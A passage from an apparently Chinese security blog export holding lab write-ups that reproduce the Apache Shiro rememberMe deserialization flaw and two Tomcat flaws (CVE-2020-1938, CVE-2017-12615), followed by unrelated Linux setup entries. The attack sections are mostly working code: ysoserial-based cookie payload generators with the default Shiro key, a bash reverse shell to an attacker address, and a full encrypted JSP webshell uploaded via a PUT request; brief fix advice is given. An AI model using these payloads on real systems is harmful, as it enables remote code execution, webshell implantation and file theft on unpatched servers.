class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import sys<br>import uuid<br>import base64<br>import subprocess<br>from Crypto.Cipher import AES<br><br><br>def encode_rememberme(command):<br>    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial-master-SNAPSHOT.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br>    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)<br>    iv = uuid.uuid4().bytes<br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    return base64_ciphertext<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    payload = encode_rememberme(sys.argv[1])    <br>print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())<br></code></pre></td></tr></table></figure><p><code>s.py </code> 使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 s.py 192.168.1.203:1099<br></code></pre></td></tr></table></figure><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><code>shiron.py</code> 内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import sys<br>import base64<br>import uuid<br>from random import Random<br>import subprocess<br>from Crypto.Cipher import AES<br><br>def encode_rememberme(command):<br>    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial-master-SNAPSHOT.jar&#x27;, &#x27;URLDNS&#x27;, command], stdout=subprocess.PIPE)<br>    BS   = AES.block_size<br>    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br>    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;<br>    #key =  &quot;Z3VucwAAAAAAAAAAAAAAAA==&quot;<br>    #key = &quot;wGiHplamyXlVB11UXWol8g==&quot;<br><br>    mode =  AES.MODE_CBC<br>    iv   =  uuid.uuid4().bytes<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    return base64_ciphertext<br><br>if __name__ == &#x27;__main__&#x27;:<br>    payload = encode_rememberme(sys.argv[1])    <br>    with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:<br>        print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()),file=fpw)<br></code></pre></td></tr></table></figure><p><code>shiro.py</code> 使用方法（回显）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 shiro.py &quot;http://test.test&quot;<br></code></pre></td></tr></table></figure><hr><h3 id="shiro-command"><a href="#shiro-command" class="headerlink" title="shiro_command"></a>shiro_command</h3><p><code>shiro_command.py</code> 内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import sys<br>import base64<br>import uuid<br>from random import Random<br>import subprocess<br>from Crypto.Cipher import AES<br><br>def encode_rememberme(command):<br>    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial-master-SNAPSHOT.jar&#x27;, &#x27;CommonsCollections2&#x27;, command], stdout=subprocess.PIPE)<br>    BS   = AES.block_size<br>    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br>    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;<br>    mode =  AES.MODE_CBC<br>    iv   =  uuid.uuid4().bytes<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    return base64_ciphertext<br><br>if __name__ == &#x27;__main__&#x27;:<br>    payload = encode_rememberme(sys.argv[1])    <br>    with open(&quot;payload.cookies&quot;, &quot;w&quot;) as fpw:<br>        print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()), file=fpw)<br></code></pre></td></tr></table></figure><p><code>shiro_command.py</code> 使用方法（命令执行，payload 在 payload.cookies 文件内）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 shiro_command.py &quot;ping -c 127.0.0.1&quot;<br></code></pre></td></tr></table></figure><h3 id="Burp-插件"><a href="#Burp-插件" class="headerlink" title="Burp 插件"></a>Burp 插件</h3><p><a href="https://www.jython.org/download">Jython（用于将 Python 代码转换成 JAVA 代码）</a></p><p><img src="plugin.png"></p><p><img src="plugin-2.png"></p><p>Shiro Discovery 内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># /usr/bin/env python<br># _*_ coding:utf-8 _*_<br>__author__ = &#x27;tkswifty&#x27;<br><br>from burp import IBurpExtender<br>from burp import IHttpListener<br>from burp import IHttpRequestResponse<br>from burp import IResponseInfo<br>from burp import IRequestInfo<br>from burp import IHttpService<br>import sys<br>import time<br>import os<br>import re<br>import random<br><br><br>class BurpExtender(IBurpExtender, IHttpListener):<br><br>    def __init__(self):<br>        self.payload = [&#x27;rememberMe&#x27;,&#x27;rmemberMe-tk&#x27;]<br>        <br><br>    def registerExtenderCallbacks(self, callbacks):<br>        print(&quot;[+] #####################################&quot;)<br>        print(&quot;[+]     Shiro Discovery&quot;)<br>        print(&quot;[+]     Author: tkswifty&quot;)<br>        print(&quot;[+] #####################################\r\n\r\n&quot;)<br>        self._callbacks = callbacks<br>        self._helpers = callbacks.getHelpers()<br>        callbacks.setExtensionName(&#x27;Shiro Discovery&#x27;)<br>        callbacks.registerHttpListener(self)<br><br>    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):<br>        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:<br>            # 监听Response<br>            if not messageIsRequest:<br><br>                &#x27;&#x27;&#x27;请求数据&#x27;&#x27;&#x27;<br>                # 获取请求包的数据<br>                resquest = messageInfo.getRequest()<br>                analyzedRequest = self._helpers.analyzeRequest(resquest)<br>                request_header = analyzedRequest.getHeaders()<br>                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()<br>                request_host, request_Path = self.get_request_host(request_header)<br>                request_contentType = analyzedRequest.getContentType()<br>                if  len(filter(lambda x: &#x27;Cookie&#x27; in x, request_header))&gt;0:<br>                pass<br>                else:<br>                request_header.append(&quot;Cookie:&quot;)<br><br><br>                # 获取服务端的信息，主机地址，端口，协议<br>                httpService = messageInfo.getHttpService()<br>                port = httpService.getPort()<br>                host = httpService.getHost()<br>                protocol = httpService.getProtocol()<br><br>                #修改cookie检测shiro<br>                self.sendPayload(request_header, host, port, protocol, request_bodys,messageInfo)<br><br><br>    # 发起请求并进行Shiro检测<br>    def sendPayload(self, request_header, host, port, protocol, request_bodys,messageInfo):<br>    for shiroHeader in self.payload:<br>    for i in xrange(0,len(request_header)):<br>    if request_header[i].startswith(&quot;Cookie:&quot;):<br>    request_header[i] = request_header[i]+&quot;;&quot;+shiroHeader+&quot;=shiroDiscover&quot;<br>    newRequest = self._helpers.buildHttpMessage(request_header,self._helpers.stringToBytes(request_bodys))<br>                        if &#x27;s&#x27; in protocol:<br>                            ishttps = True<br>                        else:<br>                            ishttps = False<br>                        expression = r&#x27;.*(443).*&#x27;<br>                        if re.match(expression, str(port)):<br>                           ishttps = True<br>                        rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)<br><br>                        #新的请求响应包<br>                        analyzedResponse = self._helpers.analyzeResponse(rep)<br>                        rep_headers = analyzedResponse.getHeaders()<br>                        expression = r&#x27;.*(deleteMe).*&#x27;<br>                        for rpheader in rep_headers:<br>                            if rpheader.startswith(&quot;Set-Cookie:&quot;) and re.match(expression, rpheader):<br>                                response_is_shiro = True<br>                                messageInfo.setHighlight(&#x27;orange&#x27;)<br>                                print &quot;[+] Find Shiro application&quot;<br>                                print &quot;\t[-] host:&quot; + str(host)<br>                                print &quot;\t[-] port:&quot; + str(port)<br><br><br>    # 获取请求的url<br>    def get_request_host(self, reqHeaders):<br>        uri = reqHeaders[0].split(&#x27; &#x27;)[1]<br>        host = reqHeaders[1].split(&#x27; &#x27;)[1]<br>        return host, uri<br><br>    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数<br>    def get_request_info(self, request):<br>        analyzedIRequestInfo = self._helpers.analyzeRequest(request)<br>        reqHeaders = analyzedIRequestInfo.getHeaders()<br>        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()<br>        reqMethod = analyzedIRequestInfo.getMethod()<br>        reqParameters = analyzedIRequestInfo.getParameters()<br>        reqHost, reqPath = self.get_request_host(reqHeaders)<br>        reqContentType = analyzedIRequestInfo.getContentType()<br>        print(reqHost, reqPath)<br>        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType<br><br>    # 获取响应的一些信息：响应头，响应内容，响应状态码<br>    def get_response_info(self, response):<br>        analyzedIResponseInfo = self._helpers.analyzeRequest(response)<br>        resHeaders = analyzedIResponseInfo.getHeaders()<br>        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()<br>        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。<br>        # resStatusCode = analyzedIResponseInfo.getStatusCode()<br>        return resHeaders, resBodys<br><br>    # 获取请求的参数名、参数值、参数类型（get、post、cookie-&gt;用来构造参数时使用）<br>    def get_parameter_Name_Value_Type(self, parameter):<br>        parameterName = parameter.getName()<br>        parameterValue = parameter.getValue()<br>        parameterType = parameter.getType()<br>        return parameterName, parameterValue, parameterType<br><br>    def doActiveScan(self, baseRequestResponse, insertionPoint):<br>        pass<br><br>    def doPassiveScan(self, baseRequestResponse):<br>        self.issues = []<br>        self.start_run(baseRequestResponse)<br>        return self.issues<br><br>    def consolidateDuplicateIssues(self, existingIssue, newIssue):<br>        &#x27;&#x27;&#x27;<br>        相同的数据包，只报告一份报告<br>        :param existingIssue:<br>        :param newIssue:<br>        :return:<br>        &#x27;&#x27;&#x27;<br><br>        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():<br>            return -1<br><br>        return 0<br></code></pre></td></tr></table></figure><hr><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05  漏洞利用"></a>0x05  漏洞利用</h2><p>在已有的<code>cookie</code> 值后面接 <code>;rememberMe=1</code> 如返回 <code>rememberMe=deleteMe</code> 则说明可能存在 <code>shiro</code> 漏洞</p><p><img src="1.png"></p><p>1、攻击端监听 9999 端口</p><p><img src="nc.png"></p><p>2、构造反弹 shell 命令，并进行 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Base64编码</a> （如不进行 Base64编码 可能会出现问题）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.203/9999 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>3、攻击端开启 JRMP（端口为：8888）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &quot;【Base64 编码后的反弹 shell 命令】&quot;<br></code></pre></td></tr></table></figure><p><img src="jrmp.png"></p><p>4、使用 s.py 获取 Payload（此处端口为 JRMP 的端口）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 s.py 192.168.1.203:8888<br></code></pre></td></tr></table></figure><p><img src="s.png"></p><p>5、将获取到的 Payload 到 Burp 粘贴并发送</p><p><img src="bp.png"></p><p>6、此时可看到靶机已连接 JRMP</p><p><img src="jrmp-2.png"></p><p>监听的 9999 端口已获取到反弹的 shell</p><p><img src="nc-2.png"></p><h2 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06  漏洞修复"></a>0x06  漏洞修复</h2><p>1、升级shiro到1.2.5及以上<br>2、删除代码里的默认密钥<br>3、默认配置里注释了默认密钥<br>4、如果不配置密钥，每次会重新随机一个密钥</p><h2 id="0x07-参考-URL"><a href="#0x07-参考-URL" class="headerlink" title="0x07 参考 URL"></a>0x07 参考 URL</h2><p><a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a><br><a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Apache Shiro 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Apache Shiro 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Tomcat CVE-2020-1938 任意文件读取漏洞复现</title>
      <link href="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/"/>
      <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%206,7,8,9/CVE-2020-1938/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h3><p><code>Tomcat</code> 默认开启的 <code>AJP</code> 服务。端口号为 <code>8009</code>，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响 <code>Tomcat</code> 服务器 <code>webapp</code> 目录里的任意文件。</p><h3 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h3><p>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p><h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /tomcat/CVE-2020-1938/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h3><p>1、环境开启后访问如下</p><p><img src="1.jpg"></p><p>2、进入环境目录在进入 <code>/webapps/ROOT/WEB-INF</code> 目录下创建 <code>test.txt</code> 用于测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo 01 &gt; ./webapps/ROOT/WEB-INF/test.txt<br></code></pre></td></tr></table></figure><p>3、使用 <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">Python</a> 脚本对文件进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 192.168.10.233 -f /WEB-INF/test.txt<br></code></pre></td></tr></table></figure><p><img src="2.jpg"></p><h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h3><p>1、临时禁用 <code>AJP</code> 协议端口，在 <code>conf/server.xml</code> 配置文件中注释掉 <code>&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p><p>2、配置 <code>ajp</code> 配置中的 <code>secretRequired</code> 跟 <code>secret</code> 属性来限制认证</p><p>3、升级到最新版</p><h3 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h3><p><a href="https://www.cnblogs.com/L0ading/p/12341112.html">https://www.cnblogs.com/L0ading/p/12341112.html</a></p><p><a href="https://www.cnblogs.com/Sylon/p/12516428.html">https://www.cnblogs.com/Sylon/p/12516428.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Apache Tomcat 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Apache Tomcat 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Tomcat CVE-2017-12615 任意文件写入漏洞复现</title>
      <link href="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/"/>
      <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Tomcat%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%207,8/CVE-2017-12615/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">参考</a></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Tomcat 7.0.0 - 7.0.81</p><p>Apache Tomcat 8.5.19</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /tomcat/CVE-2017-12615/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、环境开启后访问页面如下</p><p><img src="1.jpg"></p><p>2、在  <code>BP</code>中构造如下 <code>POC</code> 并发包（此处用的是冰蝎3.0自带的jsp码，密码为冰蝎右下角的rebeyond）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PUT /1.jsp/ HTTP/1.1<br>Host: 192.168.10.233:8080<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 542<br><br>AAAAA&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;bbbb<br></code></pre></td></tr></table></figure><p><img src="bp.jpg"></p><p>3、使用冰蝎进行连接</p><p><img src="2.jpg"></p><p><img src="3.jpg"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>1、配置 <code>readonly</code> 和 <code>VirtualDirContext</code> 值为 <code>Ture</code> 或注释参数，临时规避安全风险</p><p>2、更新到新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/backlion/p/7590797.html">https://www.cnblogs.com/backlion/p/7590797.html</a></p><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a></p>]]></content>
      
      
      <categories>
          
          <category> Apache Tomcat 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Apache Tomcat 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置 JAVA 环境</title>
      <link href="/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/"/>
      <url>/2021/02/10/Linux/JAVA%E7%8E%AF%E5%A2%83/JAVA%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  更新软件包列表<br>sudo apt-get update<br>#  安装 openjdk-8-jdk<br>sudo apt-get install openjdk-8-jdk -y<br>#  查看 java 版本<br>java -version<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu更换软件源</title>
      <link href="/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/"/>
      <url>/2021/02/10/Linux/ubuntu%20%E6%9B%B4%E6%8D%A2%E8%BD%AF%E4%BB%B6%E6%BA%90/%E9%85%8D%E7%BD%AE%E6%BA%90/</url>
      
